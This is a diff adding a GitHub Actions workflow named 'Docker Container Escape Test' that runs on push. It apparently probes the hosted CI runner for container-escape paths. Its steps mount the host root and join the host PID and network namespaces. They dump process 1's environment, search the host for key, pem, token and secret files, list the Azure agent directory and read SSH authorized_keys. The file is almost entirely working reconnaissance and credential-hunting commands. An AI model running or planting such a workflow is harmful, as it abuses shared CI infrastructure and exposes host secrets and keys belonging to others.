@@ -1,0 +1,31 @@
+name: Docker Container Escape Test
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Host filesystem access via Docker
+        run: |
+          echo "=== Try privileged container ==="
+          docker run --rm --privileged alpine:latest cat /etc/hostname 2>&1 || echo "privileged failed"
+          
+          echo "=== Try mounting host root ==="
+          docker run --rm -v /:/host alpine:latest cat /host/etc/hostname 2>&1 || echo "mount failed"
+          
+          echo "=== Try host PID namespace ==="
+          docker run --rm --pid=host alpine:latest cat /proc/1/environ 2>&1 | tr "\0" "\n" | head -5 || echo "pid ns failed"
+          
+          echo "=== Try host network ==="
+          docker run --rm --network=host alpine:latest ip addr 2>&1 || echo "network failed"
+          
+          echo "=== Check for mounted secrets ==="
+          docker run --rm -v /:/host alpine:latest find /host -name "*.key" -o -name "*.pem" -o -name "*token*" -o -name "*secret*" 2>/dev/null | head -20
+          
+          echo "=== Check host process list ==="
+          docker run --rm --pid=host alpine:latest cat /proc/1/cmdline 2>&1 | tr "\0" " " 
+          
+          echo "=== Check for Azure agent ==="
+          docker run --rm -v /:/host alpine:latest ls -la /host/var/lib/waagent/ 2>/dev/null || echo "no waagent"
+          
+          echo "=== Check .ssh ==="
+          docker run --rm -v /:/host alpine:latest cat /host/home/*/.ssh/authorized_keys 2>/dev/null || echo "no ssh keys"
